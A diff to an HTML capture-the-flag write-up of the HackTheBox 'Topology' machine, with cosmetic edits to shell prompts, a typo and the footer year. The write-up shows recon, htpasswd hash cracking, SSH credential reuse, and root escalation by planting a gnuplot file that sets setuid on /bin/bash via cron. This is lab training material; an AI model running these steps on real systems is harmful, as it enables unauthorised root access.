@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Topology</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Easy</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Topology</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Easy</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">06</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Topology</h3><br/>
 Topology is an easy-level machine on HackTheBox. Initially, we need to exploit a LaTeX Injection to gain access to system files. <br/><br/>
@@ -44,7 +44,7 @@ While searching for Apache configuration files, we discovered the root directory
 Following some enumeration, we stumbled upon a cron job that runs all .plt files situated in <code>/opt/gnuplot</code>. Since we possess write permissions in this directory, we crafted a malicious .plt file to execute commands as the root user.<br/><br/>
 <h3><br>Recon</br></h3><br>
 Firstly, we will conduct a port scan to discover open ports on the victim machine. Using the nmap tool, we'll execute the following scan:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.217</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -56,7 +56,7 @@ Firstly, we will conduct a port scan to discover open ports on the victim machin
 </pre></div>
 
 Now, having identified the open ports on the victim machine, we'll perform a comprehensive scan to detect the technologies and services exposed through these ports.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.217</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.217</span> <span class="p">(</span><span class="mf">10.10.11.217</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.18</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -76,13 +76,13 @@ Now, having identified the open ports on the victim machine, we'll perform a com
 At this stage, we've confirmed the presence of both an HTTP service and an SSH service.<br/><br/>
 <h3><br>Web Application</br></h3><br>
 Prior to accessing the website via our browser, we'll use 'whatweb' to identify the technologies utilized by this website.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.217</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.217</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.217</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Apache</span><span class="p">[</span><span class="mf">2.4.41</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">Email</span><span class="p">[</span><span class="n">lklein</span><span class="nd">@topology</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.217</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="n">Miskatonic</span> <span class="n">University</span> <span class="o">|</span> <span class="n">Topology</span> <span class="n">Group</span><span class="p">]</span>
 </pre></div>
 
 From the information gathered, one domain stands out: <code>topology.htb</code>.<br/><br/>
 I will append this domain to my <code>/etc/hosts</code> file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -99,7 +99,7 @@ When we access the web, we will encounter the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/1.png"/><br/><br/>
 <h3><br>Subdomain Enumeration</br></h3><br>
 As we have a domain, we can attempt to discover subdomains. To do this, we'll utilize the <a href="https://github.com/ffuf/ffuf">ffuf</a> tool.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
        <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
@@ -138,7 +138,7 @@ As we have a domain, we can attempt to discover subdomains. To do this, we'll ut
 </pre></div>
 
 We've observed that all responses are consistently returning a length of 6767 bytes. To filter out these specific results, we'll use the <code>--fs</code> parameter with the specified length.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span> <span class="o">--</span><span class="n">fs</span><span class="o">=</span><span class="mi">6767</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">topology</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Host: FUZZ.topology.htb"</span> <span class="o">--</span><span class="n">fs</span><span class="o">=</span><span class="mi">6767</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
        <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
@@ -168,7 +168,7 @@ We've observed that all responses are consistently returning a length of 6767 by
 </pre></div>
 
 It uncovered two subdomains, but I'm only able to access <code>stats.topology.htb</code>. Whenever I attempt to access <code>dev.topology.htb</code>, it prompts me for credentials. Nevertheless, I'll add these subdomains to my <code>/etc/hosts</code> file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -186,7 +186,7 @@ While inspecting the main web page, I noticed a hyperlink leading to a new subdo
 When attempting to access it, my browser cannot resolve that domain.<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/3.png"/><br/><br/>
 This is due to the need to add it to our <code>/etc/hosts</code> file, directing it to the IP address of the victim machine.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -250,12 +250,12 @@ Now that we have access to this file, let's proceed with a careful examination o
 Here, we've identified the <code>dev.topology.htb</code> directory. Next, let's attempt to read the <code>/var/www/dev/.htpasswd</code> file.<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/17.png"/><br/><br/>
 We've successfully accessed the file and obtained some credentials. However, the password is in hashed format, but we can attempt to crack it. I'll proceed by copying the file's content to my attacker machine.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">vdaisley</span><span class="p">:</span><span class="err">$</span><span class="n">apr1</span><span class="err">$</span><span class="mi">1</span><span class="n">ONUB</span><span class="o">/</span><span class="n">S2</span><span class="err">$</span><span class="mi">58</span><span class="n">eeNVirnRDB5zAIbIxTY0</span>
 </pre></div>
 
 Now, using <a href="https://github.com/openwall/john">John the Ripper</a>, I'll attempt to crack the hashed password.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">creds</span><span class="o">.</span><span class="n">txt</span>
 <span class="ne">Warning</span><span class="p">:</span> <span class="n">detected</span> <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">"md5crypt"</span><span class="p">,</span> <span class="n">but</span> <span class="n">the</span> <span class="n">string</span> <span class="ow">is</span> <span class="n">also</span> <span class="n">recognized</span> <span class="k">as</span> <span class="s2">"md5crypt-long"</span>
 <span class="n">Use</span> <span class="n">the</span> <span class="s2">"--format=md5crypt-long"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">force</span> <span class="n">loading</span> <span class="n">these</span> <span class="k">as</span> <span class="n">that</span> <span class="nb">type</span> <span class="n">instead</span>
 <span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
@@ -271,7 +271,7 @@ Now, using <a href="https://github.com/openwall/john">John the Ripper</a>, I'll 
 </pre></div>
 
 We've successfully cracked the password and obtained credentials for <code>dev.topology.htb</code>. One avenue we can explore is reusing these credentials to connect as the <code>vdaisley</code> user via SSH, considering that <code>vdaisley</code> is also a system user.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">vdaisley</span><span class="o">@</span><span class="mf">10.10.11.217</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">vdaisley</span><span class="o">@</span><span class="mf">10.10.11.217</span>
 <span class="n">vdaisley</span><span class="o">@</span><span class="mf">10.10.11.217</span><span class="s1">'s password: </span>
 <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04.6</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.4.0</span><span class="o">-</span><span class="mi">150</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
 
@@ -287,35 +287,35 @@ We've successfully cracked the password and obtained credentials for <code>dev.t
 <span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
 <span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
 
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Great! We've successfully gained access to the system. Now, let's proceed to read the first flag.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">f37e8cd09abccf7c371ac6022d38c2e1</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 I recommend setting the <code>TERM</code> environment variable to the value <code>xterm</code> for a more comfortable shell experience.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as root</br></h3><br>
 As vdaisley, we do not appear to belong to any particularly interesting system group.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1007</span><span class="p">(</span><span class="n">vdaisley</span><span class="p">)</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Moreover, we do not have any sudo privileges assigned to us.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">vdaisley</span><span class="p">:</span> 
 <span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">vdaisley</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">topology</span><span class="o">.</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Upon searching for SUID files, we didn't discover any that seem particularly interesting.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">pppd</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">policykit</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
@@ -332,34 +332,34 @@ Upon searching for SUID files, we didn't discover any that seem particularly int
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 At this stage, I'll download <a href="https://github.com/DominicBreuker/pspy">pspy</a> onto the victim machine to monitor the processes and commands running on the system. After running <code>pspy</code> for about a minute, it detected the execution of a cron job.<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/topology/img/18.png"/><br/><br/>
 The cron job appears to be searching for <code>.plt</code> files within <code>/opt/gnuplot</code>, and these files are being interpreted using <code>gnuplot</code>.<br/><br/>
 Upon inspecting the privileges for <code>/opt/gnuplot</code>, it's evident that we have the capability to write files in this directory.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span>
 <span class="n">total</span> <span class="mi">4</span>
 <span class="n">drwx</span><span class="o">-</span><span class="n">wx</span><span class="o">-</span><span class="n">wx</span> <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">14</span> <span class="mi">07</span><span class="p">:</span><span class="mi">45</span> <span class="n">gnuplot</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 We can attempt to create a malicious <code>.plt</code> file and aim to acquire access as the root user.<br/><br/>
 Upon researching, I found an <a href="http://www.bersch.net/gnuplot-doc/system.html">article</a> demonstrating how to run system commands using <code>gnuplot</code>. By placing the content <code>system "(command)"</code> into a <code>.plt</code> file and interpreting it with <code>gnuplot</code>, it will execute the specified command.<br/><br/>
 Let's try assigning Set-UID privileges to the <code>/bin/bash</code> file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'system "/usr/bin/chmod u+s /bin/bash"'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">gnuplot</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">plt</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'system "/usr/bin/chmod u+s /bin/bash"'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">gnuplot</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">plt</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 After approximately a minute of waiting, the Set-UID permission was successfully assigned to <code>/bin/bash</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1183448</span> <span class="n">Apr</span> <span class="mi">18</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+<span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
 </pre></div>
 
 Executing <code>bash</code> with the <code>-p</code> parameter will grant us the ability to run commands as the root user:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<div class="highlight"><pre><span></span><span class="nd">vdaisley@topology</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># whoami</span>
 <span class="n">root</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.0</span><span class="c1"># cat /root/root.txt</span>
@@ -371,7 +371,7 @@ Executing <code>bash</code> with the <code>-p</code> parameter will grant us the
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
